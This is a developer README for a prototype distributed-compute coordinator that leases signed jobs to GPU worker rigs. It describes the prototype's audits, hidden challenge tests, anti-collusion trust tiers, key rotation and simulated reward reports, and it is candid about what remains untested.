# Boats N Hoes — Useful Compute MVP

This directory contains an early local coordinator/worker scaffold for the RX 470 useful-compute prototype. It is not a blockchain miner and does not use Ethereum consensus.

## Implemented (Phase 1: durable local MVP)

- FastAPI coordinator built by `create_app()`; all job state lives in SQLite (WAL mode), so jobs and leases **survive a coordinator restart**.
- Explicit job state machine: `queued → leased → accepted`, with `rejected`, `expired` and `failed` final states. Every transition is written to an `events` audit table.
- **Atomic claiming** with `BEGIN IMMEDIATE` transactions: two workers, or two coordinator processes on the same database, can't lease the same job.
- **Leases** (`LEASE_SECONDS`, default 60): if a worker goes silent, its job is requeued. After `MAX_ATTEMPTS` (default 3) the job is marked `failed`. Wrong answers requeue the job until attempts run out, then it's `rejected`.
- **Idempotent submissions**: resubmitting the same accepted result returns the original receipt and is paid only once. A different worker submitting after acceptance gets `409`. Late submissions from a worker that lost its lease get `403`. Expired jobs get `410`.
- **The worker verifies the coordinator's Ed25519 manifest signature** (HMAC-SHA256 until 0.5.9), the payload hash, the task type and the deadline before it executes anything. A job signed by a different coordinator is refused.
- `GET /v1/ledger` includes job counts and `consistency_problems`, an invariant check an auditor can run at any time. `GET /v1/jobs/{id}` shows a job's status and audit trail.
- A local CPU demo worker that runs a deterministic SHA-256 task (a test fixture, not useful work).
- Vulkan device-enumeration diagnostic helper.
- 13 tests: restart persistence, lease expiry and requeue, retry exhaustion, job expiry, wrong worker, duplicate and conflicting submissions, malformed results, 20-thread concurrent claims, tampered or foreign manifests, and secrets kept out of API responses.

## Implemented (Phase 2: task interface + pinned models)

- **Pluggable task executors** (`app/tasks.py`). Every job type implements `validate`, `available`, `execute` and `verify`. The coordinator validates payloads when a job is created, and workers only advertise task types they can actually run.
- **Verdicts state how much they prove.** `exact` means the coordinator recomputed or fully checked the answer (`demo:sha256`). `schema-only` means the result is well-formed but unproven (`llm:generate`). Receipts and the ledger record `verifier_method`, `confidence` and `needs_audit`.
- **`llm:generate` task** for small text generation via llama.cpp: greedy decoding (temperature 0), a fixed seed, `max_tokens` capped at 256, and a 5–300 s timeout. The worker re-hashes the model file before every run.
- **Pinned model registry** (`models/registry.json`, `app/model_registry.py`) records source URL, upstream, license, approximate size and minimum VRAM. A model can't be used until its sha256 and size are **pinned from a file you downloaded**. The first candidate, Qwen2.5-0.5B-Instruct Q4_K_M (Apache-2.0, ~400 MB), ships **unpinned**.
- **Opt-in download only:** `python -m app.model_registry download <id> <dir> --yes-download [--expect-sha256 HEX]`. Model weights are git-ignored. Since 0.5.58 the download and the pin are hardened against a hostile server or a damaged registry (see "fetching and pinning model files safely" below).
- Older Phase 1 databases are migrated in place.
- 32 tests in total.
- **Safer llama-cli runs (0.5.35, `llm-run-v1`, `app/llm_runner.py`).** The prompt goes to llama-cli in a private file (folder `0700`, file `0600`, deleted after the run), never on the command line where any local user can read it with `ps`. llama-cli gets a short allow-list environment (PATH, HOME, locale and temp settings, `VK_ICD_FILENAMES`, `VK_DRIVER_FILES`, `MESA_*`, `RADV_*`, `GGML_VK_*`; secret-looking names dropped), so `OPERATOR_TOKEN`, `SUBMITTER_TOKEN` or an enrollment code loaded from `.env` never reach it. `LLM_VK_DEVICE=N` pins the worker to one card (`GGML_VK_VISIBLE_DEVICES=N`); `LLM_GPU_LAYERS` (default 99) and `LLM_THREADS` set `-ngl` and `-t`; a bad value stops the worker offering `llm:generate`. Every run uses context size 2048, stdin closed, at most 64 KiB of output and the job's timeout; on timeout the whole process group is stopped. Failures raise a short reason that never contains the prompt, and `demo_worker.py` skips that job (the lease runs out and another worker gets it) instead of crashing. 26 tests with a **fake** llama-cli script; no model has run here. The flag names follow llama.cpp's `llama-cli`; if a newer build splits plain completion into `llama-completion`, point `LLAMA_CLI` at that. Phase 3 has to confirm both on the rig.

## Implemented (Phase 4: audits, tie-breakers and challenges)

A result hash is not proof that a GPU ran a model. Phase 4 adds the ways the coordinator gathers evidence anyway. Every check is tested in software only; none has run against real GPU output yet.

- **Hidden re-run audits.** When an unproven (`schema-only`) result is accepted, the coordinator re-queues the same job for a *different* worker at rate `AUDIT_RATE` (default 0.25, chosen with the OS's secure randomness). The original worker can never claim its own audit. The audit job is created in the same database transaction as the acceptance, and it gets the same time window as the original, so its deadline doesn't give it away.
- **Trust tiers for the audit rate** (`audit-tier-v1`, threat #1, since 0.5.15). The rate depends on the worker's own record, read from the ledger at the moment it submits: a rig with a **strike** (any `failed-challenge` or `outvoted` result) is `suspect` and re-checked at `AUDIT_RATE_SUSPECT` (default 1.0, every result); a rig with fewer than `AUDIT_NEW_UNTIL` (default 5) results that passed an independent check (`confirmed` or `passed-challenge`) is `new` and re-checked at `AUDIT_RATE_NEW` (default 0.5); everyone else is `established` at `AUDIT_RATE`. The rate used is never below `AUDIT_RATE`. Tiers change how often a rig is checked, **never its points**. The tier is operator-only (trust report, `/v1/audits` lists the policy, `/v1/operator/health` names rigs with a strike); it is not in any event, envelope or receipt. Limits: two ring members who audit each other can "confirm" fakes and graduate out of `new` (threat #3); strikes don't expire in v1, and until real GPU output is measured (threat #13) an honest rig could be outvoted over a tiny difference and get one; more re-checks cost the other rigs compute. Software only, 7 tests.
- **Tolerance rules** (`results_agree` on each task): SHA must match byte for byte; AI text must match after collapsing whitespace. Anything else (one word, letter case) is a disagreement.
- **Outcomes.** Agreement marks both results `confirmed` with confidence `replicated`. Disagreement marks both `disputed` and their points are held. An audit that never runs (expires, fails, or is rejected) leaves the original `unaudited`. Audits never spawn audits.
- **Hidden tie-breakers** (`TIEBREAK`, default on). When an audit disagrees, the coordinator queues the same job for a *third* worker that is neither side of the dispute, in the same transaction and with the same time window. Majority of three: if the tie-breaker agrees with exactly one side, that side and the tie-breaker become `confirmed` and the other side becomes `outvoted` (points stay held). If it agrees with neither (or both), all three are `unresolved` and held for a person. If no third worker picks it up, the dispute stays held and a `tiebreak_not_run` event is recorded. Tie-breakers never spawn more audits or tie-breakers.
- **Random auditor assignment** (closes threat #4). An audit or tie-breaker is not first-come. The moment it is queued, the coordinator picks one eligible worker at random (OS secure randomness) and only that worker can claim it. Eligible means: not revoked, not excluded (directly or through its owner), and active, i.e. it asked for a job, sent a result or enrolled within `AUDITOR_ACTIVE_SECONDS` (default 300). If the pick doesn't claim it within `AUDIT_ASSIGN_SECONDS` (default 120), is revoked, or gives it back (lease timeout, rejected result), it is re-assigned at random, avoiding the previous pick when anyone else is eligible. If nobody is eligible yet, the audit waits and is assigned on the next request. Polling faster no longer wins more audits. The pick is recorded as a private `auditor_assigned` event and shown to the operator in `/v1/audits`; workers never see it.
- **Audit follow-through** (threat #4 follow-up, since 0.5.17). Random picks stop a rig from *grabbing* audits, but a rig can still *let go* of ones it doesn't like and they move on to someone else. The trust report (`/v1/workers/{id}/trust`) now has `audit_follow_through`: how many audits/tie-breakers the rig was `assigned`, how many it `completed`, and how many it dropped, split into `not_claimed` (never picked up within `AUDIT_ASSIGN_SECONDS`, logged as a private `audit_assignment_expired` event), `lease_expired` (took it, then went silent) and `refused` (its result failed the shape check). **Since 0.5.37 (`follow-through-v2`):** a pick that was busy taking *other* jobs during its window is counted as `not_reached`, not as a drop. Jobs go out oldest first, so work queued before the audit comes first; an online rig that is working through that backlog never sees the audit and has no say in it, so it isn't flagged for it. Only leases inside the window count (work taken before the pick doesn't excuse going silent after it). A rig picked again for the same audit is judged on its latest pick only, a lease that ran out is never counted twice, and a pick the operator revoked is not a drop. `/v1/operator/health` lists every rig's drop count in `audit_dropouts` and warns about rigs at or above `AUDIT_DROP_WARN` (default 3). Lifetime counts, operator-only, and they change **nothing** about points or audit rates: a rig that just went offline looks exactly like one skipping checks on purpose, so this is a reason to look, not proof. Software only, 12 tests.
- **Who gets picked to audit** (`auditor-pick-v1`, threat #4 and #6, since 0.5.23). Random picks treat every eligible rig the same, so a rig that was just caught cheating (`suspect` under `audit-tier-v1`) still checks other rigs' work and can be the deciding vote in a tie-breaker. `AUDITOR_PICK=trusted-first` changes the pick for audits and tie-breakers: still random, but only among the most trusted tier that has an eligible rig, in the order `established`, `new`, `suspect`. A rig with a strike only audits when nobody else is eligible (better than no check at all). Tiers are worked out at the moment of each pick, the previous pick is still avoided first (so a silent established rig hands over to a `new` one, not straight back to itself), and same-owner, revoked and inactive rigs stay excluded as before. Hidden tests aimed at a rig or tier are unchanged. The private `auditor_assigned` event notes the pool (`candidates=1 pool=established`); ledger copies drop event details as before. `/v1/audits` shows the rule under `audit_policy.auditor_pick`, operator health shows `auditor_pick` and, while it's `uniform` and some rig has a strike, warns that the rig can still audit others. **Off by default (`uniform`)**: audit and tie-breaker work pays the same points as normal work, so `trusted-first` shifts that share toward established rigs, and a ring that has graduated its rigs to `established` (threat #3) gets more of the audits, not fewer. Switching it on is the owner's call. Software only, 11 tests.
- **Who may settle a dispute** (`tiebreak-trust-v1`, threat #6, since 0.5.34). A tie-breaker that sides with one of the two disputed results normally decides the case: the odd one out is `outvoted` (a strike). If the tie-breaker and the rig it agrees with are in the same ring, two colluders outvote an honest rig. `TIEBREAK_DECIDES=established-only` lets a majority settle the dispute only when *both* rigs on the winning side (the tie-breaker and the rig it sided with) are `established` under `audit-tier-v1`, judged from their records just before the vote. Otherwise all three results stay `disputed` (held), nobody gets a strike, a private `tiebreak_held_for_review` event records which side it agreed with and each rig's tier, and the case shows up in the review queue as `needs_review`. Three different answers stay `unresolved` as before. Hidden from workers (the public bucket is `held` either way, and the event is private); ledger copies drop its detail. `/v1/audits` shows the rule under `audit_policy.tiebreak_decides`, operator health shows `tiebreak_decides`. **Off by default (`always`)**: while every rig is new, every dispute would wait for a person, and there is still no override for held points (scoring v2), so switching it on is the owner's call. It doesn't help against a ring whose rigs are already `established`. Software only, 11 tests.
- **Vouch check** (threat #3, `vouch-check-v1`, since 0.5.43). A colluding auditor that confirms a friend's fake answer leaves both results `confirmed`, and nothing looks wrong. Once the friend is caught (a strike: failed hidden test or outvoted), its earlier agreements are worth a second look. `GET /v1/operator/vouches` (or `python -m app.vouches [--json]`, which opens the database read-only) lists the `caught_rigs`; each `case` where a caught rig's answer agreed with another (original, audit or tie-breaker, with rig, owner label and points); `leads`: every rig that agreed with a caught rig, how often and with whom, how many hidden tests it has passed, caught pairs first (`also_caught`); and `weak_confirmations`: confirmed results whose only independent agreement came from a caught rig, with their points. Operator health adds `vouches` and warns about `unchecked_leads` (not revoked, not caught themselves, never passed a hidden test) with the next step: aim a hidden test at each (`target_worker`). Honest rigs show up as leads too (a cheater is often honest on most jobs), so a lead is a reason to check, not evidence. **Read-only**: no points, statuses, tiers or picks change; what should happen to weakly confirmed points is scoring v2 (owner decision). No prompts or answers in the report, but it names who audited whom, so it is operator-only. Software only, 12 tests.
- **Following up the leads** (threat #3, `lead-tests-v1`, since 0.5.44). Each lead in the vouch check now also shows `open_aimed_tests` (hidden tests aimed at it by name that it can still take, before their deadline) and `task_types` (the kinds of job it agreed on), and the report adds `leads_to_test`: unchecked leads with no aimed test waiting. `OPERATOR_TOKEN=... python -m app.challenge_pool issue-leads --pool <private file> --url <coordinator> [--max 10] [--task T] [--dry-run]` reads that list and aims **one** test from your private pool at each rig on it, of a task type it agreed on (or `--task`). Every pool rule still holds (crossed off before sending, put back only on a clear refusal, revealed tests retired and another one tried). Running it again leaves rigs that already have a test waiting alone, so tests don't pile up on one rig; a test that ran out its deadline unanswered lets the rig be picked again. It refuses a coordinator older than this (no `leads_to_test`), stops at the first refusal, and prints rig names and job ids only. `--dry-run` sends nothing and doesn't touch the pool. Operator health's vouch warning says how many leads already have a test waiting. Changes who gets tested, never points. Software only, 18 tests; run against a real uvicorn coordinator (dry run and wrong-token refusal) with no leads, because leads need confirmed AI jobs and so llama-cli and a model.
- **Operator review queue** (threat #7, since 0.5.18). Some held points can't be settled by the software: a dispute whose tie-breaker never ran (often only two rigs online) or was never scheduled (`TIEBREAK=false`), an `unresolved` three-way disagreement, and a failed hidden test (cheat, wrong model, or honest GPU differences). `GET /v1/operator/review` (or `python -m app.review [--all] [--json]`, which opens the database read-only) lists every case with points held: its `stage` (`needs_review`, `waiting` for a tie-breaker, or `decided_by_majority`, listed for spot checks because two colluding rigs can outvote an honest one), why, the input, every answer side by side with the rig, owner label and strike count, which answers agree under the task's own tolerance rule, points held and how long. `?needs_person_only=true` hides the rest. `/v1/operator/health` adds `review` counts and a warning when anything needs a person. **Read-only**: there is no override; what a person's decision should do to points is part of scoring v2 (owner decision). It shows answers and hidden tests' expected answers, so it is operator-only and never logged. Software only, 13 tests.
- **Hidden challenge jobs.** The operator queues a known-answer job with `POST /v1/challenges`. Workers get the same envelope, the same receipt and the same audit-trail events as normal work. A wrong (but well-formed) answer is accepted on the surface, so a cheater can't tell they were caught, and recorded as `failed-challenge` with points held.
- **Aimed hidden tests** (threat #1 and #8, since 0.5.21). A normal hidden test goes to whichever rig asks first, so you can't make sure the brand-new rig, or the one that was just caught, is the one that gets tested. `POST /v1/challenges` now takes one optional target:
  - `"target_worker": "rig-c"`: only that rig can take it, until the job's own deadline, even if it is offline for a while. Unknown rig `404`, revoked rig `409`. If you revoke it later, the test waits and nobody else gets it.
  - `"target_tier": "new"` (or `suspect`, `established`): a random **active** rig in that `audit-tier-v1` tier, worked out at the moment it is handed out. If the pick doesn't show up within `AUDIT_ASSIGN_SECONDS`, another rig in the same tier gets it. If no rig is in that tier yet, it waits.
  - Setting both is refused (`422`); setting neither keeps the old first-come behaviour.
  The rig gets the same envelope as any job and can't see the target. Who was picked is recorded privately (`test_assigned`, `test_unassigned`, `test_assignment_expired`), never in the public job view or the logs, and kept separate from audit follow-through counts. `/v1/audits` shows each test's `target`; `/v1/operator/health` adds `aimed_tests` (`open`, `waiting_for_rig`) and a warning when one has no rig. Ledger copies drop the target (tiers are operator-only); copies made before 0.5.21 still check cleanly. Two new consistency checks: an aimed test taken by a rig it wasn't assigned to, or by a rig other than the one it names. It changes **who gets checked**, never points. 15 tests.
- **A private stock of hidden tests** (`test-pool-v1`, threat #1, #8 and #11, since 0.5.33). Aimed tests only exist if you write them, one request at a time, and each one should be fresh. `python -m app.challenge_pool` keeps prepared tests (input + known answer) in one private file and sends them a few at a time:
  - `init --pool FILE` makes the file readable by you only (`0600`), refuses an existing file and any folder inside a git repo (the answers must never be committed). Every later command refuses the file if other users can read it.
  - `add --pool FILE --file tests.jsonl` takes one JSON object per line (`task_type`, `payload`, `expected_result`) and checks each one the way the coordinator will: known task type, same size limits, the task's own payload check (for `llm:generate`, the model must be pinned on this machine) and the answer must pass the task's own verifier. An input already in the pool, or used before, is skipped, and since 0.5.39 so is a near copy of one (same words ignoring case, spacing, punctuation and settings like the seed). `make-demo --count N` adds SHA-256 practice tests (only good for rehearsing: the coordinator recomputes those answers anyway).
  - `status --pool FILE [--json]`: counts only, never an input or answer; says when it's running low.
  - `issue --pool FILE --url URL --count N [--task T] [--tier new|suspect|established | --worker RIG] [--ttl S]` with `OPERATOR_TOKEN` in the environment picks tests at random (secure randomness) and queues them through `POST /v1/challenges`. No points are sent, so `POINTS_TABLE` decides them like for normal work. Each test is **crossed off and saved before it is sent**, so a crash or lost connection can never send it twice (it shows as `sending` or `unknown`). It goes back into the pool only when the coordinator clearly refused it and created nothing (`401`, `403`, `404`, `409` revoked rig, `422`, `429` after 5 tries, `503` paused); a test refused because a ledger copy revealed its input or a near copy of it (`409`, `test-reuse-v1`/`v2`) is retired instead. It stops at the first problem rather than burning through the pool. Exit 0 all sent, 1 stopped or unsure, 2 refused.
  - The pool file is rewritten whole and swapped in, so a crash leaves the old or the new file, never half. It holds the answers: keep it off worker machines and out of backups other people can open.
  It doesn't write good tests: an `llm:generate` answer has to come from running the pinned model yourself (Phase 3). 29 tests; 16 rules switched off one at a time, each caught. Run once against a real coordinator here with SHA-256 practice tests (2 aimed at `tier:new` queued, unknown rig and paused coordinator refused with the tests put back, no input in the log). Software only.
- **Operator endpoints** (`/v1/challenges`, `/v1/audits`, `/v1/workers/{id}/trust`, `/v1/operator/review`, `/v1/operator/vouches`, `/v1/operator/health`) require the `X-Operator-Token` header to match `OPERATOR_TOKEN`. If the token isn't set, they are disabled.
- **Public ledger** (`GET /v1/ledger`) adds `points_by_status`: confirmed, pending, unverified, held. Challenge outcomes are folded into confirmed/held so the public view doesn't reveal which jobs were challenges. The public job view hides audit and challenge events. **Since 0.5.38 (`public-delay-v1`, threat model #14):** folding alone wasn't enough, because *when* points land gave hidden tests away: normal AI work lands in pending/unverified, while a hidden test lands straight in confirmed (passed) or held (failed), so a rig reading the totals just before and after submitting knew at once. Now every result counts as `pending`, and its `confidence` is withheld (`null`, `settlement_visible: false`), for `PUBLIC_SETTLE_DELAY_SECONDS` (default 3600) after it was accepted, whatever kind of job it was; that also stops an auditor seeing its result flip to `replicated` and learning its job was a re-check. The response says `view: public-delayed` and the delay. With the operator token the same endpoint is live (`view: operator-live`; a wrong token is refused and counts toward the lock-out). `total_simulated_points` and job counts are not delayed. `0` restores the live view and operator health warns. 11 tests; 9 ways of breaking it, each caught. Software only. **Since 0.5.40 (`public-no-hashes-v1`):** public entries no longer carry `result_hash` (the sha256 of the answer). A re-check that agrees has the same hash as the job it re-checked, so the hash paired the two for anyone, at once and forever: a rig could count how often its own work is re-checked, an auditor could find its own hash on another rig's row and know its job was a re-check (undoing the withheld `confidence`), and a passed hidden test showed the hash of the expected answer. The hash isn't in `/health` or `GET /v1/jobs/{id}` either. The response lists `public_rules` and `hidden_fields`; the operator view keeps the hashes; `PUBLIC_SETTLE_DELAY_SECONDS=0` doesn't bring them back. Ledger copies already blanked them. 6 tests; 3 ways of breaking it, each caught.
- New consistency checks: a pending audit with no open audit job, a job leased to an excluded worker, a worker auditing its own result, a worker breaking a tie on its own dispute, an outvoted/unresolved result with no tie-breaker behind it, and an audit or tie-breaker taken by a worker it wasn't assigned to.
- 19 tests for Phase 4 plus 9 for random assignment (82 in total), including an in-place migration of a Phase 2 database and a tampered-database check.
- **Written threat model:** [`docs/VERIFICATION-THREAT-MODEL.md`](../docs/VERIFICATION-THREAT-MODEL.md) lists each attack, today's defense, what is still open, and the order of fixes.

## Implemented (Phase 5: simulated reward reports)

Off-chain points only. Nothing is minted, sent or promised.

- **Versioned scoring rule** `sim-points-v1` (`app/rewards.py`), integer math only. Each accepted result sits in one public bucket: `confirmed` and `unverified` are payable; `pending` (a hidden re-run is still queued) and `held` (disputed, outvoted, unresolved, or a failed hidden test) are not. Unverified work counts because spot-checking only works if unsampled honest work is paid. v1 has no extra penalty for a caught cheater.
- **Optional penalty rule `sim-points-v2-forfeit` (0.5.36, threat #15, off by default).** Set `REWARD_SCORING=sim-points-v2-forfeit` (or `python -m app.rewards report --scoring sim-points-v2-forfeit`). A rig is `struck` for a period if any of its results accepted in that period failed a hidden test or was outvoted by a tie-breaker; a struck rig forfeits its `unverified` points for that period. `confirmed` points (work that passed an independent check) are never forfeited, and held cases with no strike (`disputed`, `unresolved`, a tie-breaker held for a person) cost nothing. Each worker row gains `struck` and `forfeited_points`, totals gain `forfeited_points`; entries are unchanged, so the report still never says which result was the strike or that it was a hidden test. The rule version is in the signed fields and in `report_sha256`, so `verify` rebuilds with the same rule, also from a shared ledger copy. v1 reports keep their exact shape and hashes. Operator health shows `reward_scoring`; an unknown value stops the coordinator at start. **Choosing it is the owner's call.** Limits: it only reaches the period of the strike (a cheater who fakes in one period and gets caught in the next keeps the first period's points); a rig learns that one of its held results counted as a strike; and honest rigs can be struck by real GPU differences until Phase 3 measures them (#13). Software only, 13 tests.
- **Per-worker report** for a period (`since <= accepted_at < until`): accepted results, points per bucket, payable points, and activity (leases, rejected answers, lease timeouts, bad submissions).
- **Auditable and reproducible.** The report carries `report_sha256` over its canonical JSON. The same ledger and the same period always give the same hash. `python -m app.rewards verify report.json --db <db>` re-runs it and lists any entry that differs, and catches an edited report file.
- **Self-checks** in every report: the ledger's consistency problems, and whether per-worker sums match the totals.
- **Never leaks hidden checks.** Reports list job ids, buckets, verifier method and confidence only: no job kinds, results, payloads, expected answers or secrets.
- **Operator-only** (`GET /v1/rewards/report`, needs `X-Operator-Token`). A live per-job view would let a worker see a "held" right after submitting and guess it was a hidden test. Publish a report only after its period has closed.
- Statuses are read when the report is built, so a pending re-run that settles later changes the report for the same period; `verify` says so.
- 10 tests for Phase 5 (61 in total). Also run end to end with a real coordinator process, two demo workers, the HTTP endpoint and the CLI `report`/`verify`.

Build and check a report:

    python -m app.rewards report --db ./data/prototype.sqlite3 --since 0 --until 1800000000 --out report.json
    python -m app.rewards verify report.json --db ./data/prototype.sqlite3

**Fraud risks that remain (be honest about these):**
- **Collusion.** Two workers run by the same person can agree on a wrong answer. Agreement is evidence, not proof. Workers now need an operator code and a per-worker key, and same-owner workers never audit each other, but a person who gets codes under several names is still a ring. In a tie-breaker, two colluders can even outvote an honest auditor.
- **Rings with many enrolled rigs.** Audits now go to a random eligible rig (fixed in 0.5.8), but a ring that keeps more rigs active still gets more of the draws.
- **Repeated payloads.** An audit has the same payload as the original. Colluding workers who compare notes could spot it.
- **Trusted coordinator.** The coordinator picks auditors, stores expected answers, and could lie about all of it. Signed reward reports (0.5.11) stop anyone from editing a report after it's issued, but the coordinator can still sign wrong numbers.
- **Real GPU nondeterminism is unknown.** The whitespace-only tolerance is a guess until two real rigs produce output for the same job. It may need loosening (or a different check) after Phase 3.
- **Two rigs aren't enough for a tie-breaker.** With only two workers online, a dispute stays held until a person looks at it.

**Not done yet:** `llm:generate` has **never run** on project hardware: no llama.cpp build, no downloaded model and no RX 470 test yet (Phase 3). Inference results are only checked for shape (`schema-only`). Phase 4 re-run audits are needed before they mean anything.

To try inference on a GPU box later:

    # copy the file's SHA256 from its page on Hugging Face (Files > the .gguf file)
    python -m app.model_registry download qwen2.5-0.5b-instruct-q4_k_m ./models --yes-download --expect-sha256 <SHA256>
    python -m app.model_registry pin qwen2.5-0.5b-instruct-q4_k_m ./models/Qwen2.5-0.5B-Instruct-Q4_K_M.gguf --expect-sha256 <SHA256>
    LLAMA_CLI=/path/to/llama-cli MODEL_DIR=./models python demo_worker.py

**Still missing (honest limits):** anyone who can reach the API can create normal jobs, and owner labels depend on the operator handing out codes carefully. The coordinator is trusted. (The old shared-secret forgery risk is fixed in 0.5.9: see asymmetric manifest signatures below.) An inference adapter exists (Phase 2) but is untested on real hardware, and there is no RX 470 validation yet (Phase 3).

## Implemented: per-worker keys and authenticated registration

Closes threat-model item #2 *as far as the operator hands out codes carefully*. Tested in software only.

- **One-time enrollment codes.** The operator makes a code tied to an `owner` label (the person or group running the rig) with `POST /v1/enrollments` (needs `X-Operator-Token`) or `python -m app.workers enroll --owner <label>`. A code works once and expires (default 24 h, at most 7 days).
- **Per-worker keys.** A rig sends the code once to `POST /v1/workers/register` and gets its own random key back (`bnhw_…`, 256 bits). The key is shown once; the coordinator stores only its sha256, and never stores codes in plain text either.
- **Every claim and submit needs the key** (`Authorization: Bearer <key>`). The worker id comes from the key. Naming a different worker id gets `403`, a missing or unknown key gets `401`. One rig can't claim or submit as another.
- **No take-overs.** A code can't be used to grab a worker id that already has a key (`409`, and the code is not used up). An existing worker changes its capabilities by registering again with its own key, and gets no new key.
- **Revocation.** `POST /v1/workers/{id}/revoke` (operator) or `python -m app.workers revoke <id>` blocks the key at once and puts any job the worker is holding back in the queue. Its past results stay for the operator to review. A revoked worker id can't re-enroll.
- **One owner never checks itself.** Hidden re-runs and tie-breakers are closed to every worker with the same owner as the worker(s) they exclude, not just the same worker id. A new consistency check flags any job given to a same-owner worker.
- `python -m app.workers list` shows each worker's owner and whether it is active, revoked, or keyless. The trust report shows `owner` and `revoked`. Keys never appear in any API response, listing or log.
- Older databases are migrated in place. Workers registered before this change have no key and must enroll with a code (same worker id is fine).
- The demo worker saves its key to `./data/worker-<id>.key` (owner-only file permissions, git-ignored) on the first run and reuses it after.
- 12 new tests (73 in total). Also run end to end with a real coordinator process: one code from the API, one from the CLI, two demo workers, a reused code refused, a saved key reused, and a revoked worker refused.

**What this does not fix:** owner labels are only as honest as the operator's hand-out. One person who talks the operator into several codes under different names is still a Sybil ring. There is no proof of personhood. (Until 0.5.19 there was also no rate limit on the API and anyone could queue normal jobs; both are fixed, see "who may queue jobs" below.)

**Your two RX 470s:** if both cards get the same owner label, they will never audit each other, so with only those two rigs online no audit ever runs. For a two-card test, enroll them under two labels (for example `owner-gpu0` and `owner-gpu1`) and remember that agreement between two cards you own proves less than agreement between strangers.

## Implemented: asymmetric manifest signatures (threat model #9)

Tested in software only (0.5.9).

- **Only the coordinator can sign jobs.** It holds an Ed25519 private key in `./data/coordinator-signing.key` (or `COORDINATOR_SIGNING_KEY_FILE`), created on first start with owner-only permissions. The coordinator refuses to start if other users on the machine can read the file. Signatures look like `ed25519:<128 hex>`.
- **Workers hold no secret.** They check signatures with the coordinator's public key from `GET /v1/coordinator/key` (public key + a short fingerprint like `0c74-ea31-24dd-92f4`). Before, every worker had the same HMAC secret, so any worker could sign fake jobs for the others.
- **Pinning.** The demo worker saves the public key on first contact (`./data/coordinator.pub`, owner-only) and prints its fingerprint so the rig owner can compare it with the operator's. If the coordinator ever serves a different key, the worker stops instead of trusting it. For a stronger first run, the operator gives the key out of band: `--coordinator-key` or `BNH_COORDINATOR_KEY`.
- `python -m app.signing` prints the public key and fingerprint for the operator to share.
- `PROTOTYPE_SECRET` is no longer used; the coordinator logs a warning if it is still set.
- 7 new tests (89 in total), including a worker that tries to sign a job with its own key, a genuine signature copied onto another job, legacy HMAC signatures, and an impostor coordinator. Also run end to end: coordinator + demo worker (first-contact pin, job accepted), then a second coordinator with a new key on the same address (worker refused to run).

**Limits:** jobs created before 0.5.9 carry the old HMAC signature and are refused by new workers, so start with a fresh database. Replacing the key file by hand breaks every worker's pin; use the rotation tool below instead (0.5.16). First-contact pinning trusts whatever answers the first time, so on a real network give workers the key directly. The same key also signs closed-period reward reports since 0.5.11 (see below); it still does not sign the raw ledger.

## Implemented: planned key rotation (threat model #9 follow-up)

Tested in software only (0.5.16).

- **`python -m app.key_rotation rotate`** (stop the coordinator first) makes a new Ed25519 key and writes a **handover**: old public key → new public key, a sequence number and a time, **signed by both keys** (`purpose: bnh-coordinator-key-rotation/1`, so it can never pass as a job or report signature). The handover is added to the public file `coordinator-signing.key.history.json` next to the key, then the new key replaces the old one. The old private key is not kept. `python -m app.key_rotation show` lists the handovers.
- **Workers follow it on their own.** `GET /v1/coordinator/key` now also returns `rotations`. A demo worker whose pinned key differs from the served one checks the chain of handovers from its pin to the served key (every step signed by both keys, numbered 1, 2, 3..., each starting where the last ended, no key reused, forward only) and only then updates its pin. Anything else and it stops, as before.
- **Queued jobs keep working.** A job signed before the rotation is re-signed with the new key when a worker claims it, but only if its old signature checks out against a key this coordinator handed over from. A job signed by anyone else (for example a row edited in the database) is sent unchanged, so the worker refuses it. Each re-sign is logged (`job_resigned`, old → new fingerprint).
- **Crash-safe.** The new key waits in `coordinator-signing.key.next` until the handover is saved. If the machine dies before the handover is saved, nothing changes and the next `rotate` starts fresh. If it dies after, the coordinator refuses to start ("rotation was interrupted") and re-running `rotate` finishes the same handover instead of making a second one. The coordinator also refuses to start if the key file doesn't match the end of its history.
- Operator health shows `signing_key_rotations`.
- 10 new tests (168 in total). I switched off ten rules one at a time (old-key signature, new-key signature, numbering, linking, no reuse, the start-up history check, finishing an interrupted rotation, the worker's chain check, re-signing on claim, refusing to re-sign a foreign signature) and a test failed every time. Also run end to end: coordinator + demo worker pinned key A, a job queued, coordinator stopped, `rotate`, restarted on key B; the worker followed the handover, the queued job was re-signed and accepted.

**Limits:** a handover only helps for a **planned** rotation. Whoever holds the old private key can sign a handover (since 0.5.24 the optional offline handover key below closes this for workers that pinned it), so if that key may have been stolen, give every worker the new key directly (`--coordinator-key`) and delete its old pin instead. Workers started with `--coordinator-key` don't follow handovers; give them the new key. Old signed reward reports still check out against the old public key, which stays listed in the history file.

## Implemented: offline handover key (threat model #9 follow-up, `handover-key-v1`)

Tested in software only (0.5.24).

- **Why.** A handover signed by the old and new key works for planned rotations, but anyone who steals the coordinator's key file can sign one too, to a key of their own, and every worker would follow it. Now you can add a second key that **only signs handovers** and lives offline (a USB stick in a drawer), never on the coordinator machine.
- **`python -m app.key_rotation make-handover-key --out /media/usb/bnh-handover.key`** makes it (readable by you only). It refuses to overwrite a file and refuses the coordinator key's own folder (a key sitting next to the signing key is stolen together with it). It prints a line to add to `prototype/.env`: `COORDINATOR_HANDOVER_PUBLIC_KEY=<hex>` (public half only).
- **Workers pin it.** With that setting, `GET /v1/coordinator/key` adds `handover_key`: the handover public key, vouched for by a signature from the current coordinator key (`purpose: bnh-handover-key-announcement/1`). A demo worker that already trusts the served coordinator key checks that signature and pins the handover key in `coordinator-handover.pub` next to its other pin, on first contact or on a later run. A tampered announcement is ignored with a warning; a different announced key never replaces a pinned one (a person has to). The operator can also hand it out directly: `--handover-key` / `BNH_HANDOVER_KEY`.
- **From then on, every handover the worker follows must also be signed by that key.** `follow_chain` checks a third signature (`signatures.handover`) on each step after the worker's pinned key. Older handovers from before the key existed aren't checked. The coordinator key file alone can no longer move the worker.
- **Rotating needs the stick.** `python -m app.key_rotation rotate --handover-key-file /media/usb/bnh-handover.key`. With `COORDINATOR_HANDOVER_PUBLIC_KEY` set, `rotate` refuses to run without the file, or with a different one, because workers would refuse the handover and stop. `show` marks handovers that carry the third signature.
- The coordinator refuses to start if the handover key is one of its own signing keys (current or retired). Operator health shows `handover_key` (`rule` and `fingerprint`), or `null` when off.
